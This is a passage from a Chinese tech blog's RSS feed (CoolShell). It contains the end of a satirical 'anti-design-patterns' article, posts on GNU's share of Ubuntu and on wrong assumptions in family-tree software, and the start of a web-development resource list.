+<p>下面是11个行为不检点模式</p>
+<h5><strong>3.1 Chain of Possibilities 可能性链模式 | <span style="color: #999999;">Chain of responsibility 责任链模式</span></strong></h5>
+<p style="text-align: justify;">Chain of Possibilities 模式主旨是创造肥大的，拙劣文档的软件模块。没有人知道其功能有多宽泛，其可能性永无止境。也就是我们所说的——无确定性。</p>
+<h5><strong>3.2 Commando 突击队模式 | <span style="color: #999999;">Command 命令模式</span></strong></h5>
+<p style="text-align: justify;">Commando 模式主旨是用来应付工作，让事情快点完成。这个模式不管封装，只图快快把代码写完。反正不犯法。</p>
+<h5><strong>3.3 Intersperser 散布模式| <span style="color: #999999;">Interpreter 解释器模式</span></strong></h5>
+<p style="text-align: justify;">Intersperser 模式把一个功能的代码散布在系统的各个地方，其可以让功能无法被测试，修改，以及让人读懂。(陈皓注：这让我想起了以前VB，PB和Delphi的开发，功能的逻辑代码散步在各个组件的不同事件中)</p>
+<h5><strong>3.4 Instigator 煽动模式| <span style="color: #999999;">Iterator 迭代器模式</span></strong></h5>
+<p>Instigator 模式看上去是良性的，但是其却大规模的以暴力的方式在破坏软件系统。（陈皓注：作者没有做过多的解释，不过，我想到了<a title="Windows编程革命简史" href="https://coolshell.cn/articles/3008.html" target="_blank">Windows编程革命史</a>，应该说的就是这个吧）</p>
+<h5><strong>3.5 Momentum 冲击模式| <span style="color: #999999;">Memento 备忘模式</span></strong></h5>
+<p style="text-align: justify;">Momentum模式让软件大小，内存，CPU，和复杂度成极数级成长。（陈皓注：作者对此没做过多解释，这个特性很像Windows操作系统，每个Windows 的新版本，无论是在尺寸，内存和CPU要求上，和复杂度上都会比上一版有极数级的提高）</p>
+<h5><strong>3.6 Medicator 用药模式|<span style="color: #999999;"> Mediator 媒介模式</span></strong></h5>
+<p>Medicator 模式是一个实时的屠夫一样，其把其它的系统搞得就像被打过强力镇静剂一样没有反应。</p>
+<h5><strong>3.7 Absolver 免责模式| <span style="color: #999999;">Observer 观察者模式</span></strong></h5>
+<p style="text-align: justify;">Absolver模式表现于那些被以前员工开发的代码的问题。对于现任员工，其可以因为很多代码里历史上的问题而免除被批评，其声称其对软件中的任何问题都不负责。这也是我们从所周知的——“这不是我的代码”。（参看：<a title="程序员惯用的解释(Top 25)" href="https://coolshell.cn/articles/1174.html" target="_blank">程序员的借口</a>）</p>
+<h5><strong>3.8 Stake 利害关系模式 | <span style="color: #999999;">State 状态模式</span></strong></h5>
+<p style="text-align: justify;">Stake 模式表现于那些被现已成为经理的人写的代码中的各种问题。虽然这些问题很不爽，但是经理们在这个软件里的利害关系太高了，所以，不能让任何人重写，因为这代表着我们经理的技术成就。</p>
+<h5><strong>3.9 Eulogy 颂歌模式 | <span style="color: #999999;">Strategy策略模式</span></strong></h5>
+<p style="text-align: justify;">Eulogy 模式存在于所有的项目中，也就是 Post-Mortem(事后总结分析会)。</p>
+<h5><strong>3.10 Tempest Method 暴风雨模式| <span style="color: #999999;">Template Method 模板方法</span></strong></h5>
+<p style="text-align: justify;">Tempest Method 主要用在软件快要发布的最后几天。这个模式的物征是，代码中没有注释，并有使用了好几个Detonator Pattern 地雷模式。</p>
+<h5><strong>3.11 Visitor From Hell 地狱访问者模式 | <span style="color: #999999;">Visitor 访问者模式</span></strong></h5>
+<p style="text-align: justify;">Visitor From Hell 模式一般是在运行时没有检查数组越界的一个巧合。这样一来，我们系统就可以实现Visitor From Hell 模式，因为这样可以造成重要数据的重写。</p>
+<h4 style="text-align: left;"><span style="font-size: x-small;">参考</span></h4>
+<ul>
+<li><span style="font-size: x-small;">[1] Gamma, E., Helm, R., Johnson, R., Vlissides, J., Design Patterns &#8211; </span><span style="font-size: x-small;">Elements of Reusable Object-Oriented Software. Addison-Wesley, 1995.</span></li>
+</ul>
+<ul>
+<li><span style="font-size: x-small;">[2] Michael Duell is an Engineer at AG Communication Systems, where his </span><span style="font-size: x-small;">Resign Patterns have been rejected in favor of the Gang </span><span style="font-size: x-small;">of Four Design Patterns.</span></li>
+</ul>
+<ul>
+<li><span style="font-size: x-small;">[3] &#8220;Resign Patterns: Ailments of Unsuitable Project-Disoriented Software,&#8221; </span><span style="font-size: x-small;">The Software Practitioner, Vol. 7, No. 3, May-June 1997, p. 14.</span></li>
+</ul>
+<p style="text-align: left;"><span style="font-size: x-small;"> </span></p>
+<p style="text-align: left;"><span style="font-size: x-small;"> </span></p>
+<div style="text-align: left;"><span style="font-size: x-small;">（全文完）</span></div>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg" alt="IoC/DIP其实是一种管理思想" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a></li><li ><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png" alt="聊聊团队协同和协同工具" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22298.html" class="wp_rp_title">聊聊团队协同和协同工具</a></li><li ><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png" alt="“一把梭：REST API 全用 POST”" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22173.html" class="wp_rp_title">“一把梭：REST API 全用 POST”</a></li><li ><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/02/monitoring-150x150.jpeg" alt="谈谈公司对员工的监控" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22157.html" class="wp_rp_title">谈谈公司对员工的监控</a></li><li ><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg" alt="如何做一个有质量的技术分享" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a></li><li ><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png" alt="程序员如何把控自己的职业" width="150" height="150" /></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4844.html">“另类” 设计模式</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4844.html/feed</wfw:commentRss>
+			<slash:comments>12</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>GNU/Linux下有多少是GNU的？</title>
+		<link>https://coolshell.cn/articles/4826.html</link>
+					<comments>https://coolshell.cn/articles/4826.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 13 Jun 2011 00:25:42 +0000</pubDate>
+				<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[操作系统]]></category>
+		<category><![CDATA[GNU]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Ubuntu]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4826</guid>
+
+					<description><![CDATA[<p>一个葡萄牙的学生写了一篇文章 《How much GNU is there in GNU/Linux?》 &#8211; GNU/Linux下有多少是GNU的。...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4826.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4826.html">GNU/Linux下有多少是GNU的？</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>一个葡萄牙的学生写了一篇文章 《<a href="http://pedrocr.net/text/how-much-gnu-in-gnu-linux" target="_blank">How much GNU is there in GNU/Linux?</a>》 &#8211; GNU/Linux下有多少是GNU的。他的这篇文章主要分布了今年4月份的Ubuntu Natty的Linux分发包。其主要是用代码行来做的分析，其给了两个饼图。</p>
+<p>第一个饼图如下，其指明了各种主流的开源项目组的分布情况。可见GNU只占了8%，当然，GNome也是GNU的，加起来也只有13%，只占整个分发包很少的比重。</p>
+<p><img decoding="async" class="aligncenter" src="http://pedrocr.net/images/GNUTotalSplit.png" alt="" /></p>
+<p>第二个图，作者把GNU的部分拿了出来，再进行了分析：</p>
+<p><span id="more-4826"></span></p>
+<p>在下面这个图中，我们可以看到主要是四大块——gcc, gdb, binutils 和 glibc，所以，作者说，这些东西都不是最终用户需要的，不是每一个用户都是需要搞开发的。所以，如果去除这些，再去除Gnome（这个桌面UI也不是很力），那么GNU的东西几乎没有了。</p>
+<p><img decoding="async" class="aligncenter" src="http://pedrocr.net/images/GNUSplit.png" alt="" /></p>
+<p>所以，作者以此来挑战Richard Stallman提到的 GNU/Linux的这个说法。好像更为好的说法应该叫——</p>
+<p style="text-align: center;"><strong>GNU/KDE/java/xorg/Linux</strong></p>
+<p>我对这篇文章有下述一些感觉：</p>
+<ul>
+<li>以代码行来衡量重要性，非常的不准确。比尔盖茨说过——“用代码行数来衡量编程的进度，就如同用航空器零件的重量来衡量航空飞机的制造进度一样”（参看《<a title="最佳编程语录" href="https://coolshell.cn/articles/2753.html" target="_blank">最佳编程语录</a>》），所以，用这个数据来并不一定正确。如果用Linux的各种包的依赖性可能会更好一点。</li>
+<li>至少我知道，离开了glibc，可能整个操作系统都会不举。Linux下，绝大多数软件都是gcc/gdb编程和调试出来的（当然，LLVM和Clang正在挑战着gcc编译器），而且大多数软件都在用着GPL的许可证（<a title="狗日的开源软件许可证" href="https://coolshell.cn/articles/4657.html" target="_blank">虽然开源世界的许可证是如此的混乱</a>）</li>
+<li>辩证地，我们不能否定GNU的历史价值，同时我们似乎也在看到GNU好像有点萎靡。</li>
+</ul>
+<p>老实说，其实叫什么不重要，是GNU/Linux也好，是Ubuntu 也好，还是Android也好，无所谓。Linux的各种分发包中都存在着全世界黑客文化的和开源文化的结晶，每当我看到这样的分布图时（例如：<a title="谁写了Linux" href="https://coolshell.cn/articles/1360.html" target="_blank">是谁写的Linux?</a>），我心中都有一种说不出来的豪情，这难道不真是一种壮举吗？（<a title="Unix传奇(上篇)" href="https://coolshell.cn/articles/2322.html" target="_blank">Unix黑客文化的真正延伸</a>）。</p>
+<p>不管这种方式的软件有没有市场，能不能得到“最终用户”的认可，但这已成为了软件开发的一种精神——那种不分彼此，相互协作的精神，不是吗？</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/1097.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="Ksplice Uptrack — Ubuntu更新不用重启" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1097.html" class="wp_rp_title">Ksplice Uptrack — Ubuntu更新不用重启</a></li><li ><a href="https://coolshell.cn/articles/501.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" alt="Ubuntu的并行启动" width="150" height="150" /></a><a href="https://coolshell.cn/articles/501.html" class="wp_rp_title">Ubuntu的并行启动</a></li><li ><a href="https://coolshell.cn/articles/22320.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2022/12/eBPF-150x150.jpeg" alt="eBPF 介绍" width="150" height="150" /></a><a href="https://coolshell.cn/articles/22320.html" class="wp_rp_title">eBPF 介绍</a></li><li ><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2019/03/linux.ninja_-150x150.png" alt="打造高效的工作环境 &#8211; Shell 篇" width="150" height="150" /></a><a href="https://coolshell.cn/articles/19219.html" class="wp_rp_title">打造高效的工作环境 &#8211; Shell 篇</a></li><li ><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/12/docker-networking-1-150x150.png" alt="记一次Kubernetes/Docker网络排障" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18654.html" class="wp_rp_title">记一次Kubernetes/Docker网络排障</a></li><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4826.html">GNU/Linux下有多少是GNU的？</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4826.html/feed</wfw:commentRss>
+			<slash:comments>38</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>软件真的好难做啊</title>
+		<link>https://coolshell.cn/articles/4811.html</link>
+					<comments>https://coolshell.cn/articles/4811.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Fri, 10 Jun 2011 00:45:17 +0000</pubDate>
+				<category><![CDATA[程序设计]]></category>
+		<category><![CDATA[趣味问题]]></category>
+		<category><![CDATA[轶事趣闻]]></category>
+		<category><![CDATA[Design]]></category>
+		<category><![CDATA[Programmer]]></category>
+		<category><![CDATA[程序员]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4811</guid>
+
+					<description><![CDATA[<p>还记得以前本站的那一篇“编程好难啊”吗，那是一篇众程序员调侃程序新手的文章，有恶搞的成分在里面。今天要和大家说的这个事没有一些恶搞和调侃的意思，是比较严肃的话题...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4811.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4811.html">软件真的好难做啊</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>还记得以前本站的那一篇“<a title="编程真难啊" href="https://coolshell.cn/articles/1391.html" target="_blank">编程好难啊</a>”吗，那是一篇众程序员调侃程序新手的文章，有恶搞的成分在里面。今天要和大家说的这个事没有一些恶搞和调侃的意思，是比较严肃的话题，你一定可以从中收获一些东西。这个话题来自StackOverflow上的一个问题——<a title="Cycle in family tree software" href="http://stackoverflow.com/questions/6163683/cycles-in-family-tree-software" target="_blank">Cycle in Family Tree Software</a>，这个程序员问了下面这个问题：</p>
+<blockquote><p>我是一个写家族族谱软件的程序员（我用的是C++和Qt），这个软件基本上没有什么问题，直到有一天有个用户报告了一个bug。这个问题是这样的——<strong>我这个用户和他女儿生了两个孩子</strong>。</p>
+<p>于是，我程序员的一些断言和硬性条件导致程序报错，因为我的程序在处理这个关系的时候，其发现X即是Y的爸爸，又是Y的爷爷，所以只能报错。</p>
+<p>请问，<strong>在不需要移除我的断言和数据验证的情况下，</strong><strong>我怎么才能解决这个问题</strong>？</p></blockquote>
+<p>看到这里，请重点阅读一下下面的两点：</p>
+<ul>
+<li>如果你看到这里开始兴奋了，请你为你阴暗的心理去面壁反省10分钟，因为这是一个很技术的问题。</li>
+<li>如果你开始陷入了深深的思考如何解决这个问题，那么你绝对是一个合格的程序员，因为你已陷入技术已经很深了，有点呆了。</li>
+</ul>
+<p>我在前面说过，“<strong>这个是一个严肃的话题，你可以从中收获一些东西</strong>”，当然，我并不希望你来收获乱伦的知识和心得，酷壳是一个技术博客，应该是收获技术方面的东西。</p>
+<p><span id="more-4811"></span></p>
+<p>从技术的角度上来说，这是我们经常在设计软件时犯的错误——</p>
+<h4><strong>1）作了错误的假设</strong>（Assumption）</h4>
+<p>Assumption是软件设计的重大天敌，Assumption的动词Assume意为Ass u me &#8211; Ass you and me 。你的假设做得越多，你的设计就越不靠谱。这里的假设是——我们以为family tree是一个tree，其实并不是tree。<strong>Assumption是魔鬼</strong>。</p>
+<p>还有一些经典的Assumption如下所示</p>
+<ul>
+<li>最著名的就是那个y2k臭虫。</li>
+<li>不要以为没有2月30日，在瑞典1712年有2月30日</li>
+<li>一分钟有60秒？闰秒呢？</li>
+<li>双胞胎的生日是同一天吗？</li>
+<li>双胞胎的父亲是同一个？</li>
+<li>性别只有男和女？</li>
+<li>婚姻只能是异性？ 关于这一点，推荐一篇强文——<a href="http://qntm.org/gay" target="_blank">Gay marriage: the database engineering perspective</a> (同性婚姻：数据库工程)</li>
+</ul>
+<h4><strong>2）没有认真分析用户案例</strong>（Use Case）</h4>
+<p>在设计软件时，我们需要考虑各种各样的用户案例，比如如下的东西：</p>
+<ul>
+<li>私生子的问题</li>
+<li>一夫多妻或一妻多夫，同父异母，同母异父</li>
+<li>就算一夫多妻制违反法律，也会有离异再婚的情况</li>
+<li>同性恋的问题，虽然不能繁衍，但可以领养。</li>
+<li>换妻活动</li>
+<li>各种乱伦关系——这种东西那个民族都不少，尤其是古时候，比如：
+<ul>
+<li>先后嫁了两个人其是父子关系（昭君）</li>
+<li>达尔文同学和他的表妹，爱因斯坦的二婚是和他的表姐，埃及艳后嫁了她的弟弟，……</li>
+<li>顺治同学娶了四个老婆，这四个人还是一家人：姑姑，侄女，妹妹，女儿。（<a href="http://blog.sina.com.cn/s/blog_5e62ac110100onwa.html" target="_blank">参看这里</a>）</li>
+<li>刘邦同学的母后干出来的事，相当变态（<a href="http://bbs.tiexue.net/post2_5114346_1.html" target="_blank">参看这里</a>）</li>
+<li>中国古代的“扒灰老” （类似于楼主那个问题的Use Case）</li>
+</ul>
+</li>
+</ul>
+<p><strong>不想再列下去了，人类真TMD恶心，有点要吐了</strong>。</p>
+<p style="text-align: center;">——————————为了缓解一下恶心的气氛，请允许我插入一个搞笑短文——————————</p>
+<blockquote><p>一位自杀者在他的遗书里讲述了他自杀的原因，听起来实在让人头痛。遗书这样写道：“我和一个寡妇结了婚，她有一个已成年的女儿，我父亲跟我妻子带过来的女儿结了婚。所以我父亲就成了我的女婿，女儿就成了我的后母，我管父亲叫爸爸，而我父亲也管我叫爸爸；我女儿管我叫爸爸，但我却管她叫妈妈；我还得管我妻子叫姥姥，因为她是我后母的母亲。不久我女儿，也就是我后母生了一个儿子，他是我同父异母的弟弟，他也得管我叫姥爷，因为他也是我的外孙。后来我妻子，也就是我姥姥生了一个儿子，他是我后母的弟弟，我是他的外甥，所以儿子管我叫爸爸，我管儿子叫舅舅。另外我是我妻子，也就是我姥姥的外孙，同时也是我姥姥的丈夫，所已我也是我的外祖父。又因为我妻子是我的外祖母，我的儿子，也就是我的舅舅是我的弟弟和我女儿的弟弟，所以我……我的天哪，这么复杂的关系实在让我伤透了脑筋，我只有一死才能得以解脱……”</p></blockquote>
+<p style="text-align: center;">————————————————————————插入完毕————————————————————</p>
+<p style="text-align: left;">看完上面这个短文，不知道你是否和我一样，觉得这么一个简单的程序将是如此难做啊。<strong>另外，我决定在下一次的面试中让应聘者来设计Family Tree的程序</strong>。</p>
+<p style="text-align: left;">我又说多了，现在还是让我们回到技术上来。除了上面那几个观点，我在回复中还看到了如入一些有意思的回复：</p>
+<ul>
+<li>“我的软件没有bug，是你的生活有bug”——让我想到了<a title="程序员惯用的解释(Top 25)" href="https://coolshell.cn/articles/1174.html" target="_blank">程序员惯用的借口</a></li>
+<li>“算法中不应该加太多的限制，限制多了反而让算法不灵活。”</li>
+<li>“移除断言，并不代表就不出错，对于这种rare case，我们最好给一个Warning提醒用户，让用户确认确实是这样的。”</li>
+<li>“关于解决这个问题，移除那个断言，如果显示上会有问题的话，那就复制一下有不同关系的人就可以了”</li>
+<li>“你真的应该想想你的软件的价值是什么？市场在哪里？你真的要照顾这样的用户吗？”</li>
+</ul>
+<p>挺好的，相信你对软件开发又学到了一些东西。</p>
+<p><span style="color: #cc0000;"><strong>（转载时请勿用于商业目的，并请注明作者和出处）</strong></span><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/17680.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/02/gitlab-600-150x150.jpg" alt="从Gitlab误删除数据库想到的" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17680.html" class="wp_rp_title">从Gitlab误删除数据库想到的</a></li><li ><a href="https://coolshell.cn/articles/17459.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2016/08/HighAvailability-BK-150x150.png" alt="关于高可用的系统" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17459.html" class="wp_rp_title">关于高可用的系统</a></li><li ><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/07/inverted-bookshelf_thumb-150x150.jpg" alt="IoC/DIP其实是一种管理思想" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9949.html" class="wp_rp_title">IoC/DIP其实是一种管理思想</a></li><li ><a href="https://coolshell.cn/articles/6775.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg" alt="Bret Victor &#8211; Inventing on Principle" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6775.html" class="wp_rp_title">Bret Victor &#8211; Inventing on Principle</a></li><li ><a href="https://coolshell.cn/articles/5686.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg" alt="多些时间能少写些代码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5686.html" class="wp_rp_title">多些时间能少写些代码</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4811.html">软件真的好难做啊</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4811.html/feed</wfw:commentRss>
+			<slash:comments>79</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>开源中最好的Web开发的资源</title>
+		<link>https://coolshell.cn/articles/4795.html</link>
+					<comments>https://coolshell.cn/articles/4795.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Wed, 08 Jun 2011 00:28:52 +0000</pubDate>
+				<category><![CDATA[Web开发]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[CSS3]]></category>
+		<category><![CDATA[Database]]></category>
+		<category><![CDATA[HTML]]></category>
+		<category><![CDATA[Javascript]]></category>
+		<category><![CDATA[jQuery]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Web]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=4795</guid>
+
+					<description><![CDATA[<p>文章来源：Best “must know” open sources to build the new Web。个人感觉这个收集贴收集成相当的全。 学习HTML...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/4795.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/4795.html">开源中最好的Web开发的资源</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>文章来源：<a title="Best “must know” open sources to build the new Web" href="http://www.b2bweb.fr/molokoloco/best-must-know-ressources-for-building-the-new-web-%E2%98%85/" target="_blank">Best “must know” open sources to build the new Web</a>。个人感觉这个收集贴收集成相当的全。</p>
+<h4>学习HTML 5编程和设计</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="wallOfWonder" src="http://www.b2bweb.fr/wp-content/uploads/wallOfWonder.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://www.html5rocks.com/" target="_blank"><strong>HTML5 Rocks</strong></a> : Major Feature Groups  的学习 HTML5 的资源 (HTML5 演示, 教程 ). <a href="http://code.google.com/p/html5rocks/" target="_blank">源码</a></li>
+<li>很不错的 <a href="https://mozillademos.org/demos/dashboard/demo.html" target="_blank"><strong>HTML5 Dashboard</strong></a> &#8211; Mozilla，效果很炫。</li>
+<li><a href="http://developers.whatwg.org/" target="_blank"><strong>WhatWG Developers</strong></a>, 一个清楚的 HTML5 技术规格说明书。</li>
+<li>★ <a href="http://stackoverflow.com/" target="_blank"><strong>StackOverflow</strong></a> : 大名鼎鼎的技术问答式论坛。</li>
+<li>★ <a href="http://addyosmani.com/blog/" target="_blank"><strong>Addyosmani</strong></a>, jQuery 和 JavaScript 文章教程</li>
+<li><a href="http://www.sohtanaka.com/web-design-tutorials/" target="_blank"><strong>Sohtanaka</strong></a>, jQuery 和 JavaScript 文章和教程</li>
+<li>★ <a href="http://net.tutsplus.com/category/tutorials/" target="_blank"><strong>Nettuts+</strong></a> 是一个面对Web开发人员和设计人员的网站，提供各种技术教程和文章，覆盖 HTML, CSS, Javascript, CMS’s, PHP 和 Ruby on Rails.</li>
+<li><a href="http://tympanus.net/codrops/" target="_blank"><strong>Codrops</strong></a>, 教程和 web 资源</li>
+<li><a href="http://www.webappers.com/" target="_blank"><strong>WebAppers</strong></a>, 最好的开源资源</li>
+<li><a href="http://tutorialzine.com/" target="_blank"><strong>Tutorialzine</strong></a> – PHP MySQL jQuery CSS 教程, 资源和赠品</li>
+<li><strong><a href="https://developer.mozilla.org/en/JavaScript/Guide" target="_blank">Mozilla JavaScript guide</a></strong></li>
+<li> <a href="http://code.google.com/p/molokoloco-coding-project/" target="_blank"><strong>codes snippets</strong></a>, 作者自己收集的一些代码片段</li>
+</ul>
+<p><span id="more-4795"></span></p>
+<h4>服务器端的软件</h4>
+<p><img decoding="async" loading="lazy" class="aligncenter" title="nodeJs" src="http://www.b2bweb.fr/wp-content/uploads/nodeJs.png" alt="" width="600" height="238" /></p>
+<ul>
+<li>★ <a href="http://nodejs.org/" target="_blank"><strong>Node.js</strong></a> 是服务器端的 JavaScript 环境，其使用了异步事件驱动模式。其让Node.js在很多互联网应用体系结构下获得非常不错的性能。 <a href="https://github.com/joyent/node/" target="_blank">源码</a> 和 <a href="http://jsapp.us/" target="_blank">实时演示</a>。</li>
+<li><a href="http://www.phantomjs.org/" target="_blank"><strong>PhantomJS</strong></a> 也是一个服务器端的 JavaScript API的WebKit。其支持各种Web标准： DOM 处理, CSS 选择器, JSON, Canvas, 和 SVG</li>
+<li><strong><a href="http://www.lighttpd.net/" target="_blank">Lighttpd</a></strong> 一个轻量级的开源Web服务器。新闻，文档，benchmarks, bugs, 和 download. Lighttpd 支撑了几个非常著名的 Web 2.0 网站，如：YouTube, wikipedia 和 meebo.</li>
